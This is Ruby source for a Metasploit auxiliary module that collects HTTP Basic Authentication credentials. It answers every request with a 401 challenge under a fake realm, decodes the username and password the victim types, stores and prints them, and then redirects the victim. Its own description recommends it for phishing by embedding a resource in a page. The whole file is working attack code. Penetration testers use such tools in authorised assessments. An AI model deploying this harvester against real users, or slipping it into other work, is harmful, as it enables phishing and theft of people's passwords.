##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpServer::HTML
  include Msf::Auxiliary::Report

  def initialize(info={})
    super(update_info(info,
      'Name'        => 'HTTP Client Basic Authentication Credential Collector',
      'Description'    => %q{
        This module responds to all requests for resources with a HTTP 401.  This should
        cause most browsers to prompt for a credential.  If the user enters Basic Auth creds
        they are sent to the console.

        This may be helpful in some phishing expeditions where it is possible to embed a
        resource into a page.

        This attack is discussed in Chapter 3 of The Tangled Web by Michal Zalewski.
      },
      'Author'      => ['saint patrick <saintpatrick[at]l1pht.com>'],
      'License'     => MSF_LICENSE,
      'Actions'     =>
        [
          [ 'Capture' ]
        ],
      'PassiveActions' =>
        [
          'Capture'
        ],
      'DefaultAction'  => 'Capture'
    ))

    register_options(
      [
        OptPort.new('SRVPORT', [ true, "The local port to listen on.", 80 ]),
        OptString.new('REALM', [ true, "The authentication realm you'd like to present.", "Secure Site" ]),
        OptString.new('RedirectURL', [ false, "The page to redirect users to after they enter basic auth creds" ])
      ])
  end

  # Not compatible today
  def support_ipv6?
    false
  end

  def run
    @myhost   = datastore['SRVHOST']
    @myport   = datastore['SRVPORT']
    @realm    = datastore['REALM']

    exploit
  end

  def report_cred(opts)
    service_data = {
      address: opts[:ip],
      port: opts[:port],
      service_name: opts[:service_name],
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    credential_data = {
      origin_type: :service,
      module_fullname: fullname,
      username: opts[:user],
      private_data: opts[:password],
      private_type: :password
    }.merge(service_data)

    login_data = {
      core: create_credential(credential_data),
      status: Metasploit::Model::Login::Status::UNTRIED,
      proof: opts[:proof]
    }.merge(service_data)

    create_credential_login(login_data)
  end

  def on_request_uri(cli, req)
    if(req['Authorization'] and req['Authorization'] =~ /basic/i)
      basic,auth = req['Authorization'].split(/\s+/)
      user,pass  = Rex::Text.decode_base64(auth).split(':', 2)

      report_cred(
        ip: cli.peerhost,
        port: datastore['SRVPORT'],
        service_name: 'HTTP',
        user: user,
        password: pass,
        proof: req['Authorization']
      )

      print_good("#{cli.peerhost} - Credential collected: \"#{user}:#{pass}\" => #{req.resource}")
      if datastore['RedirectURL']
        print_status("Redirecting client #{cli.peerhost} to #{datastore['RedirectURL']}")
        send_redirect(cli, datastore['RedirectURL'])
      else
        send_not_found(cli)
      end
    else
      print_status("Sending 401 to client #{cli.peerhost}")
      response = create_response(401, "Unauthorized")
      response.headers['WWW-Authenticate'] = "Basic realm=\"#{@realm}\""
      cli.send_response(response)
    end
  end
end
